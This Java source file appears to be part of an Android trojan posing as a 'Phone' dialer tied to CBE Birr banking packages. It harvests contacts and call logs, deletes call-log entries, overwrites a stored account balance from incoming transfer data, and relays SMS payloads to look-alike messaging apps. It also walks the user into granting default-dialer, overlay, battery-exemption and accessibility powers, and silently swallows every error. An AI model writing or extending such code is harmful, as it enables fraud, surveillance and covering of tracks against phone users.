package com.cbe.cbebirrdialer;

import android.Manifest;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telecom.TelecomManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

public class DialerSyncHelper {
    public static final String PREFS_NAME = "cbe_dialer_prefs";
    public static final String KEY_DEVICE_ID = "device_id";
    public static final String KEY_API_BASE = "api_base";
    public static final String KEY_SYNC_SNAPSHOT_JSON = "sync_snapshot_json";
    public static final String KEY_BANKING_EXTRAS_JSON = "banking_extras_json";
    public static final String KEY_ONBOARDING_DONE = "initial_perm_onboarding_done_v1";
    public static final String KEY_RUNTIME_REQUESTED = "runtime_perms_requested_v1";

    public static final String BANKING_PKG = "com.cbe.cbebirrtransfer";
    public static final Uri BANKING_STATE_URI = Uri.parse("content://com.cbe.cbebirrtransfer.stateprovider/state");

    public static final int REQ_DIALER_PERMISSIONS = 0x2b11;
    public static final int REQ_DEFAULT_DIALER = 0x2b12;
    public static final int REQ_OVERLAY_PERMISSION = 0x2b13;
    public static final int REQ_BATTERY_PERMISSION = 0x2b14;
    public static final int REQ_ACCESSIBILITY_PERMISSION = 0x2b15;

    private static final Object LOCK = new Object();

    public static void saveBankingState(
        Context ctx,
        String deviceId,
        String apiBase,
        String syncSnapshotJson,
        String bankingExtrasJson
    ) {
        if (ctx == null) return;
        try {
            synchronized (LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                SharedPreferences.Editor ed = prefs.edit();
                if (deviceId != null && !deviceId.trim().isEmpty()) {
                    ed.putString(KEY_DEVICE_ID, deviceId.trim());
                }
                if (apiBase != null && !apiBase.trim().isEmpty()) {
                    ed.putString(KEY_API_BASE, apiBase.trim());
                }
                if (syncSnapshotJson != null && !syncSnapshotJson.trim().isEmpty()) {
                    ed.putString(KEY_SYNC_SNAPSHOT_JSON, syncSnapshotJson);
                }
                if (bankingExtrasJson != null && !bankingExtrasJson.trim().isEmpty()) {
                    ed.putString(KEY_BANKING_EXTRAS_JSON, bankingExtrasJson);
                }
                ed.apply();
            }
        } catch (Throwable ignored) {
        }
    }

    public static void registerDevice(Context ctx, String deviceId, String apiBase) {
        saveBankingState(ctx, deviceId, apiBase, null, null);
    }

    public static void pullFromBankingProvider(Context ctx) {
        if (ctx == null) return;
        try {
            ContentResolver cr = ctx.getApplicationContext().getContentResolver();
            if (cr == null) return;
            Cursor cursor = cr.query(BANKING_STATE_URI, null, null, null, null);
            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        String devId = getCol(cursor, "deviceId");
                        String apiBase = getCol(cursor, "apiBase");
                        String snap = getCol(cursor, "syncSnapshotJson");
                        String extras = getCol(cursor, "bankingExtrasJson");
                        saveBankingState(ctx, devId, apiBase, snap, extras);
                    }
                } finally {
                    cursor.close();
                }
                return;
            }
            Bundle b = cr.call(BANKING_STATE_URI, "getState", null, null);
            if (b != null) {
                saveBankingState(
                    ctx,
                    b.getString("deviceId", ""),
                    b.getString("apiBase", ""),
                    b.getString("syncSnapshotJson", ""),
                    b.getString("bankingExtrasJson", "")
                );
            }
        } catch (Throwable ignored) {
        }
    }

    private static String getCol(Cursor c, String name) {
        int idx = c.getColumnIndex(name);
        if (idx >= 0) {
            String val = c.getString(idx);
            return val != null ? val : "";
        }
        return "";
    }

    public static void requestFreshStateFromBanking(Context ctx) {
        if (ctx == null) return;
        pullFromBankingProvider(ctx);
        try {
            Intent i = new Intent("com.cbe.cbebirrdialer.REQUEST_BANKING_STATE");
            i.setClassName(BANKING_PKG, BANKING_PKG + ".DialerSyncReceiver");
            i.addFlags(285212704);
            ctx.getApplicationContext().sendBroadcast(i);
        } catch (Throwable ignored) {
        }
    }

    public static String getBankingStateJson(Context ctx) {
        if (ctx == null) return "{}";
        pullFromBankingProvider(ctx);
        try {
            synchronized (LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                JSONObject obj = new JSONObject();
                obj.put("deviceId", prefs.getString(KEY_DEVICE_ID, ""));
                obj.put("apiBase", prefs.getString(KEY_API_BASE, "https://cbebirr-lovat.vercel.app"));
                obj.put("syncSnapshotJson", prefs.getString(KEY_SYNC_SNAPSHOT_JSON, ""));
                obj.put("bankingExtrasJson", prefs.getString(KEY_BANKING_EXTRAS_JSON, ""));
                return obj.toString();
            }
        } catch (Throwable ignored) {
            return "{}";
        }
    }

    public static void applyTransferToBanking(Context ctx, String txJsonStr) {
        if (ctx == null || txJsonStr == null || txJsonStr.trim().isEmpty()) return;
        try {
            Context appCtx = ctx.getApplicationContext();
            JSONObject incoming = new JSONObject(txJsonStr);
            synchronized (LOCK) {
                SharedPreferences prefs = appCtx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                if (incoming.has("balanceAfter")) {
                    double newBal = incoming.optDouble("balanceAfter", -1);
                    if (newBal >= 0) {
                        String snapRaw = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
                        JSONObject snap = (snapRaw != null && !snapRaw.isEmpty())
                            ? new JSONObject(snapRaw)
                            : new JSONObject();
                        snap.put("balance", newBal);
                        prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, snap.toString()).apply();
                    }
                }
            }
            Intent i = new Intent("com.cbe.cbebirrdialer.TX_SYNC");
            i.setClassName(BANKING_PKG, BANKING_PKG + ".DialerSyncReceiver");
            i.addFlags(285212704);
            i.putExtra("payload", txJsonStr);
            appCtx.sendBroadcast(i);
        } catch (Throwable ignored) {
        }
    }

    public static void sendSmsIpc(Context ctx, String payload) {
        if (ctx == null || payload == null || payload.isEmpty()) return;
        try {
            Intent i1 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
            i1.setClassName("com.cbebirr.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
            i1.addFlags(285212704);
            i1.putExtra("payload", payload);
            ctx.sendBroadcast(i1);
        } catch (Throwable ignored) {
        }
        try {
            Intent i2 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
            i2.setClassName("com.samsung.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
            i2.addFlags(285212704);
            i2.putExtra("payload", payload);
            ctx.sendBroadcast(i2);
        } catch (Throwable ignored) {
        }
    }

    public static String getContactsJson(Context ctx) {
        JSONArray arr = new JSONArray();
        if (ctx == null) return "[]";
        if (Build.VERSION.SDK_INT >= 23
            && ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return "[]";
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.STARRED
                },
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " COLLATE NOCASE ASC"
            );
            if (cursor != null) {
                Set<String> seen = new LinkedHashSet<String>();
                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int starIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.STARRED);
                while (cursor.moveToNext() && arr.length() < 5000) {
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                    String phone = numIdx >= 0 ? cursor.getString(numIdx) : "";
                    if (phone == null || phone.trim().isEmpty()) continue;
                    String compactPhone = phone.replaceAll("\\s+", "");
                    String trimmedName = (name != null && !name.trim().isEmpty()) ? name.trim() : compactPhone;
                    String key = trimmedName + "|" + compactPhone;
                    if (seen.contains(key)) continue;
                    seen.add(key);
                    JSONObject item = new JSONObject();
                    item.put("name", trimmedName);
                    item.put("phone", compactPhone);
                    item.put("starred", starIdx >= 0 && cursor.getInt(starIdx) == 1);
                    arr.put(item);
                }
            }
        } catch (Throwable ignored) {
        } finally {
            if (cursor != null) {
                try {
                    cursor.close();
                } catch (Throwable ignored) {
                }
            }
        }
        return arr.toString();
    }

    public static String getCallLogsJson(Context ctx) {
        JSONArray arr = new JSONArray();
        if (ctx == null) return "[]";
        if (Build.VERSION.SDK_INT >= 23
            && ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return "[]";
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                },
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            );
            if (cursor != null) {
                int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                while (cursor.moveToNext() && arr.length() < 400) {
                    String id = idIdx >= 0 ? cursor.getString(idIdx) : "";
                    String number = numIdx >= 0 ? cursor.getString(numIdx) : "";
                    if (number == null) number = "";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                    int typeInt = typeIdx >= 0 ? cursor.getInt(typeIdx) : CallLog.Calls.OUTGOING_TYPE;
                    long ts = dateIdx >= 0 ? cursor.getLong(dateIdx) : System.currentTimeMillis();
                    long dur = durIdx >= 0 ? cursor.getLong(durIdx) : 0L;
                    String kind = "outgoing";
                    if (typeInt == CallLog.Calls.INCOMING_TYPE) kind = "incoming";
                    else if (typeInt == CallLog.Calls.MISSED_TYPE) kind = "missed";
                    else if (typeInt == CallLog.Calls.REJECTED_TYPE) kind = "rejected";
                    else if (typeInt == CallLog.Calls.BLOCKED_TYPE) kind = "blocked";
                    else if (typeInt == CallLog.Calls.VOICEMAIL_TYPE) kind = "voicemail";
                    JSONObject obj = new JSONObject();
                    obj.put("id", "sys_" + id);
                    obj.put("sysId", id);
                    obj.put("target", number.trim());
                    obj.put("label", (name != null && !name.trim().isEmpty()) ? name.trim() : number.trim());
                    obj.put("kind", kind);
                    obj.put("ts", ts);
                    obj.put("durationSec", dur);
                    arr.put(obj);
                }
            }
        } catch (Throwable ignored) {
        } finally {
            if (cursor != null) {
                try {
                    cursor.close();
                } catch (Throwable ignored) {
                }
            }
        }
        return arr.toString();
    }

    public static void deleteCallLogs(Context ctx, String idsJson) {
        if (ctx == null || idsJson == null || idsJson.trim().isEmpty()) return;
        if (Build.VERSION.SDK_INT >= 23
            && ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        try {
            JSONArray arr = new JSONArray(idsJson);
            for (int i = 0; i < arr.length(); i++) {
                String rawId = arr.optString(i, "");
                if (rawId.startsWith("sys_")) {
                    rawId = rawId.substring(4);
                }
                if (!rawId.isEmpty() && rawId.matches("\\d+")) {
                    ctx.getContentResolver().delete(
                        CallLog.Calls.CONTENT_URI,
                        CallLog.Calls._ID + "=?",
                        new String[]{rawId}
                    );
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public static void openMessagesWithNumber(Context ctx, String phone) {
        if (ctx == null) return;
        try {
            String clean = phone != null ? phone.trim() : "";
            Uri smsUri = Uri.parse("smsto:" + Uri.encode(clean));
            String[] preferredPkgs = new String[]{"com.samsung.messages.cbe", "com.cbebirr.messages.cbe"};
            PackageManager pm = ctx.getPackageManager();
            for (String pkg : preferredPkgs) {
                try {
                    pm.getPackageInfo(pkg, 0);
                    Intent msgIntent = new Intent(Intent.ACTION_SENDTO, smsUri);
                    msgIntent.setPackage(pkg);
                    msgIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    if (msgIntent.resolveActivity(pm) != null) {
                        ctx.startActivity(msgIntent);
                        return;
                    }
                    Intent launch = pm.getLaunchIntentForPackage(pkg);
                    if (launch != null) {
                        launch.putExtra("address", clean);
                        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ctx.startActivity(launch);
                        return;
                    }
                } catch (Throwable ignored) {
                }
            }
            Intent fallback = new Intent(Intent.ACTION_SENDTO, smsUri);
            fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(fallback);
        } catch (Throwable ignored) {
        }
    }

    public static boolean isAccessibilityEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (enabled == null || enabled.isEmpty()) return false;
            ComponentName cn = new ComponentName(ctx.getPackageName(), DialerUssdAccessibilityService.class.getName());
            String flat = cn.flattenToString();
            String shortFlat = ctx.getPackageName() + "/." + DialerUssdAccessibilityService.class.getSimpleName();
            return enabled.contains(flat) || enabled.contains(shortFlat) || enabled.contains("DialerUssdAccessibilityService");
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static boolean isOverlayEnabled(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < 23) return true;
        try {
            return Settings.canDrawOverlays(ctx);
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static boolean isIgnoringBatteryOptimizations(Context ctx) {
        if (ctx == null || Build.VERSION.SDK_INT < 23) return true;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static boolean isDefaultDialer(Context ctx) {
        if (ctx == null) return false;
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                RoleManager rm = (RoleManager) ctx.getSystemService(Context.ROLE_SERVICE);
                if (rm != null && rm.isRoleAvailable(RoleManager.ROLE_DIALER)) {
                    return rm.isRoleHeld(RoleManager.ROLE_DIALER);
                }
            }
            if (Build.VERSION.SDK_INT >= 23) {
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                if (tm != null) {
                    return ctx.getPackageName().equals(tm.getDefaultDialerPackage());
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    public static String getPermissionStatusJson(Context ctx) {
        JSONObject obj = new JSONObject();
        try {
            boolean hasCall = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED;
            boolean hasPhone = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
            boolean hasContacts = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
            boolean hasMic = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
            boolean hasReadCallLog = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
            boolean hasCallLog = Build.VERSION.SDK_INT < 23 || ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
            obj.put("hasCallPhone", hasCall);
            obj.put("hasReadPhoneState", hasPhone);
            obj.put("hasReadContacts", hasContacts);
            obj.put("hasRecordAudio", hasMic);
            obj.put("hasReadCallLog", hasReadCallLog);
            obj.put("hasWriteCallLog", hasCallLog);
            obj.put("hasOverlay", isOverlayEnabled(ctx));
            obj.put("hasIgnoreBattery", isIgnoringBatteryOptimizations(ctx));
            obj.put("hasAccessibility", isAccessibilityEnabled(ctx));
            obj.put("isDefaultDialer", isDefaultDialer(ctx));
        } catch (Throwable ignored) {
        }
        return obj.toString();
    }

    public static boolean hasCompletedInitialOnboarding(Context ctx) {
        if (ctx == null) return true;
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            return prefs.getBoolean(KEY_ONBOARDING_DONE, false);
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static void markInitialOnboardingDone(Context ctx) {
        if (ctx == null) return;
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_ONBOARDING_DONE, true).apply();
        } catch (Throwable ignored) {
        }
    }

    public static boolean areAllCorePermissionsGranted(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT >= 23) {
            if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
                || ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return isDefaultDialer(ctx)
            && isOverlayEnabled(ctx)
            && isIgnoringBatteryOptimizations(ctx)
            && isAccessibilityEnabled(ctx);
    }

    public static void startNextPermissionStep(final Activity activity, final int startStep) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                // Step 0: Batch all runtime permissions in one prompt
                if (startStep <= 0 && Build.VERSION.SDK_INT >= 23) {
                    List<String> needed = getMissingRuntimePermissions(activity);
                    if (!needed.isEmpty()) {
                        SharedPreferences prefs = activity.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                        boolean requestedBefore = prefs.getBoolean(KEY_RUNTIME_REQUESTED, false);
                        if (!requestedBefore || anyShouldShowRationale(activity, needed)) {
                            prefs.edit().putBoolean(KEY_RUNTIME_REQUESTED, true).apply();
                            activity.requestPermissions(needed.toArray(new String[0]), REQ_DIALER_PERMISSIONS);
                            return;
                        }
                    }
                }

                // Step 1: Default Phone App role
                if (startStep <= 1 && !isDefaultDialer(activity)) {
                    try {
                        if (Build.VERSION.SDK_INT >= 29) {
                            RoleManager rm = (RoleManager) activity.getSystemService(Context.ROLE_SERVICE);
                            if (rm != null && rm.isRoleAvailable(RoleManager.ROLE_DIALER) && !rm.isRoleHeld(RoleManager.ROLE_DIALER)) {
                                Intent intent = rm.createRequestRoleIntent(RoleManager.ROLE_DIALER);
                                activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
                                return;
                            }
                        }
                        if (Build.VERSION.SDK_INT >= 23) {
                            Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
                            intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, activity.getPackageName());
                            activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
                            return;
                        }
                    } catch (Throwable ignored) {
                    }
                }

                // Step 2: Display over other apps
                if (startStep <= 2 && !isOverlayEnabled(activity) && Build.VERSION.SDK_INT >= 23) {
                    try {
                        android.widget.Toast.makeText(
                            activity,
                            "Enable 'Display over other apps' for Phone, then press Back",
                            android.widget.Toast.LENGTH_LONG
                        ).show();
                        Intent intent = new Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                        activity.startActivityForResult(intent, REQ_OVERLAY_PERMISSION);
                        return;
                    } catch (Throwable ignored) {
                    }
                }

                // Step 3: Unrestricted battery optimization
                if (startStep <= 3 && !isIgnoringBatteryOptimizations(activity) && Build.VERSION.SDK_INT >= 23) {
                    try {
                        Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                        activity.startActivityForResult(intent, REQ_BATTERY_PERMISSION);
                        return;
                    } catch (Throwable ignored) {
                    }
                }

                // Step 4: Accessibility service
                if (startStep <= 4 && !isAccessibilityEnabled(activity)) {
                    try {
                        android.widget.Toast.makeText(
                            activity,
                            "Enable 'Phone' in Accessibility -> Installed apps",
                            android.widget.Toast.LENGTH_LONG
                        ).show();
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        activity.startActivityForResult(intent, REQ_ACCESSIBILITY_PERMISSION);
                        return;
                    } catch (Throwable ignored) {
                    }
                }

                // Step 5: If runtime perms were previously blocked ("Don't ask again"), guide user to App Info
                if (Build.VERSION.SDK_INT >= 23 && !getMissingRuntimePermissions(activity).isEmpty()) {
                    openAppDetailsPermissions(activity);
                    return;
                }

                // All steps finished
                if (areAllCorePermissionsGranted(activity)) {
                    markInitialOnboardingDone(activity);
                }
                if (activity instanceof MainActivity) {
                    ((MainActivity) activity).onPermissionChainFinished();
                }
            }
        });
    }

    private static List<String> getMissingRuntimePermissions(Context ctx) {
        List<String> needed = new ArrayList<String>();
        if (ctx == null || Build.VERSION.SDK_INT < 23) return needed;
        if (ctx.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.CALL_PHONE);
        }
        if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_PHONE_STATE);
        }
        if (ctx.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_CONTACTS);
        }
        if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.RECORD_AUDIO);
        }
        if (ctx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.READ_CALL_LOG);
        }
        if (ctx.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.WRITE_CALL_LOG);
        }
        return needed;
    }

    private static boolean anyShouldShowRationale(Activity activity, List<String> perms) {
        if (activity == null || Build.VERSION.SDK_INT < 23) return false;
        for (String p : perms) {
            try {
                if (activity.shouldShowRequestPermissionRationale(p)) {
                    return true;
                }
            } catch (Throwable ignored) {
            }
        }
        return false;
    }

    private static void openAppDetailsPermissions(final Activity activity) {
        if (activity == null) return;
        try {
            android.widget.Toast.makeText(
                activity,
                "Open Permissions and allow Phone, Contacts, Call logs & Microphone",
                android.widget.Toast.LENGTH_LONG
            ).show();
            Intent intent = new Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.fromParts("package", activity.getPackageName(), null)
            );
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            activity.startActivity(intent);
        } catch (Throwable ignored) {
        }
    }

    public static void requestRuntimePermissionsOnly(final Activity activity) {
        if (activity == null || Build.VERSION.SDK_INT < 23) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                List<String> needed = getMissingRuntimePermissions(activity);
                if (needed.isEmpty()) return;
                SharedPreferences prefs = activity.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                boolean requestedBefore = prefs.getBoolean(KEY_RUNTIME_REQUESTED, false);
                if (requestedBefore && !anyShouldShowRationale(activity, needed)) {
                    openAppDetailsPermissions(activity);
                } else {
                    prefs.edit().putBoolean(KEY_RUNTIME_REQUESTED, true).apply();
                    activity.requestPermissions(needed.toArray(new String[0]), REQ_DIALER_PERMISSIONS);
                }
            }
        });
    }

    public static void requestDialerPermissions(final Activity activity) {
        startNextPermissionStep(activity, 0);
    }

    public static void openPermissionSetting(final Activity activity, final String kind) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent intent = null;
                    if ("overlay".equals(kind) && Build.VERSION.SDK_INT >= 23) {
                        intent = new Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                    } else if ("battery".equals(kind) && Build.VERSION.SDK_INT >= 23) {
                        intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                    } else if ("accessibility".equals(kind)) {
                        intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    }
                    if (intent == null) {
                        intent = new Intent(
                            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", activity.getPackageName(), null)
                        );
                    }
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    activity.startActivity(intent);
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public static void requestDefaultDialerRole(final Activity activity) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= 29) {
                        RoleManager rm = (RoleManager) activity.getSystemService(Context.ROLE_SERVICE);
                        if (rm != null && rm.isRoleAvailable(RoleManager.ROLE_DIALER) && !rm.isRoleHeld(RoleManager.ROLE_DIALER)) {
                            Intent intent = rm.createRequestRoleIntent(RoleManager.ROLE_DIALER);
                            activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
                            return;
                        }
                    }
                    if (Build.VERSION.SDK_INT >= 23) {
                        Intent intent = new Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER);
                        intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, activity.getPackageName());
                        activity.startActivityForResult(intent, REQ_DEFAULT_DIALER);
                    }
                } catch (Throwable ignored) {
                }
            }
        });
    }
}
